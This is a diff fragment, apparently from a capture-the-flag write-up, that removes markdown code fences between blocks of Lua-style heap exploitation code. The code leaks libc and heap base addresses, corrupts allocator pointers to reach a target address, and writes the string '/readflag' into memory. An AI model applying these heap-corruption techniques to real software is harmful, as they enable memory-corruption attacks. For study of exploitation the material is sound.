@@ -168,11 +168,6 @@ function set_int64(obj, off, val)
  end
 end
 print(barr.move(barr,barr))
-```
-
-
-
-```
 a = bytes.new(0x430)
 b = bytes.new(0x20)
 a.move(a,b)
@@ -183,29 +178,14 @@ c = bytes.new(0x20)
 heapbase=(get_int64(c,0)<<12)-0x600
 print(string.format("[+] libcbase address is 0x%x", libcbase))
 print(string.format("[+] heapbase address is 0x%x", heapbase))
-```
-
-
-
-```
 >>> hex(87<<40)
 '0x570000000000'
 >>>
-```
-
-
-
-```
 a=bytes.new(0x20)
 a=bytes.new(0x20)
 a=bytes.new(0x20)
 a.move(a,a)
 set_int64(a,0,0x6161616161616161)
-```
-
-
-
-```
 a=bytes.new(0x30)
 a=bytes.new(0x30)
 a=bytes.new(0x30)
@@ -220,11 +200,6 @@ b=bytes.new(0xb8)
 set_int64(a,0x28,target)
 
 set_int64(b,0,0x6161616161616161)
-```
-
-
-
-```
 set_int64(a,0x28,heapbase+0x2a0)
 set_int64(b, 0x8, 0x616c66646165722f)
 set_int64(b, 0x10, 0x67)
